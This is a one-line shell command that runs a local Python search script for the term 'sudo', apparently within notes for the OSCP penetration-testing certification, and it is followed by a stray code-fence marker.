python3 _sistema/herramientas/buscar.py 'sudo' -v --oscp
```
